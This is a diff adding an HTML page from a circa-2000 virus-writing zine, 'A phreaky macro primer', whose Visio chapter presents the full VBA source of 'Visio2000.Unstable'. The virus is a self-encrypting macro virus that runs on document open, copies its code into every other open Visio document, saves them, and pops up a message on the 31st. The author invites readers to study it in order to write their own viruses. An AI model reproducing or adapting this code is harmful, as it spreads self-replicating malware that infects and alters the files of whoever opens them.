@@ -1,0 +1,106 @@
+<HTML>
+<HEAD>
+   <TITLE>Tutorials - A Phreaky Macro Primer 0.1 - Visio 5/2000</TITLE>
+</HEAD>
+<BODY TEXT="#000000" BGCOLOR="#C0C0C0" LINK="#800000" VLINK="#800000" ALINK="#800000" BACKGROUND="tuback01.gif">
+<blockquote>
+  <PRE><b>
+=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=[LineZer0 Network 99]=-=
+                                                      ?    ?    ?        
+                                                        ?  ____  
+                                                          /    \ ?
+      A phreaky macro primer v0.1                     ?  / \ _  \  ?
+      .by jackie / Metaphase                            ( .o o.  ) ___
+                                                      __/   ^    \/   \
+                                                     /  \___o____      \
+=-=[ Visio 5/2000 ]=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-</b>
+
+     .Introduction to Visio macros
+     .The worlds first native Visio virus
+
+   [ Music ]
+   
+     .Keith Caputo .Died Laughing
+     .Creed .My own prison
+     .Metallica .Metallica
+
+<b>
+.Introduction to Visio macros</b>
+
+    Welcome all to the  Visio part of  this primer.  The first native virus
+that infects a Visio application was written by me. It was called Unstable.
+The second one was called Radiant, written by my friend Anti-State-Tortoise
+(Hi there!).  Visio is a nice app to make kewl drawings etc,  hell, I dunno
+what you can use Visio for, I just wrote a virus for.  Well, enough talked,
+let us take a look on the virus Visio virus ever. Btw, this is just a short
+intro, really short intro to Visio. 
+
+<b>
+.The worlds first native Visio virus</b>
+
+    Heyas,  I am very proud to present you here the first virus written for
+Visio ever. It is an native virus which uses simple layer encryption. Let's
+take a look at the code.
+
+---[ code starts here ]----------------------------------------------------
+
+ Private Sub Document_DocumentOpened(ByVal doc As IVDocument)
+ CryptKey = 0
+ For CryptLoop = 9 To 27
+ ThisDocument.VBProject.VBComponents(1).CodeModule.ReplaceLine CryptLoop, 
+CryptIt(Mid(ThisDocument.VBProject.VBComponents(1).CodeModule.Lines(CryptLoop, 1), 2), 
+CryptKey)
+ Next
+ Unstable
+ End Sub
+ Private Sub Unstable()
+ 'On Error Resume Next
+ 'Randomize: CryptKey = Int(Rnd * 50) + 200
+ 'ThisDocument.VBProject.VBComponents(1).CodeModule.ReplaceLine 2, "CryptKey = " & 
+CryptKey
+ 'For CryptLoop = 9 To 27
+ 'ThisDocument.VBProject.VBComponents(1).CodeModule.ReplaceLine CryptLoop, Chr(39) & 
+CryptIt(ThisDocument.VBProject.VBComponents(1).CodeModule.Lines(CryptLoop, 1), CryptKey)
+ 'Next
+ 'OurCode = ThisDocument.VBProject.VBComponents(1).CodeModule.Lines(1, 39)
+ 'For y = 1 To Documents.Count
+ 'If Documents(y).Description &lt;&gt; "Visio2k.Unstable" Then
+ 'Documents(y).Description = "Visio2k.Unstable"
+ 'With Documents(y).VBProject.VBComponents(1).CodeModule
+ '.DeleteLines 1, .CountOfLines
+ '.InsertLines 1, OurCode
+ 'End With
+ 'Documents(y).Save
+ 'End If
+ 'Next
+ 'If Day(Now()) = 31 Then MsgBox "Unstable, it's hard to be the one who's strong" & vbCr 
+& "Who's always got a shoulder to cry on" & vbCr & "Who's got a shoulder for me?", 
+vbQuestion, "Visio2000.Unstable"
+ 'ThisDocument.Save
+ End Sub
+ Private Function CryptIt(What, CryptKey)
+ For CryptLoop = 1 To Len(What)
+ CryptIt = CryptIt & Chr(Asc(Mid(What, CryptLoop, 1)) Xor CryptKey)
+ Next
+ End Function
+ 'Visio2000.Unstable
+ 'The first non-Microsoft VBA virus and the first VBA virus for Visio!
+ 'Do not spread this shit! For educational purpose only!
+ 'Written by jackie /Lz0NT/MVT on jan, 13th 2000
+ 'Greets and thanks to Darkman/29A for all help and support!
+
+---[ code starts here ]----------------------------------------------------
+
+    As you can see, Unstable works similar to every other macro bug and I'm
+really too tired to explain the code.  So if you want to write your own bug
+for Visio read the code thousand times and learn from it.  It is native, so
+nothing special. I want to greet someone here,  AntiState my man, where are
+ya? Mail me you bastard. ;)
+
+                               -End Of Part #7-
+
+<b>=-=[EOF]=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=[LineZer0 Network 99]=-=</b>
+</PRE>
+</blockquote>
+</BODY>
+</HTML>
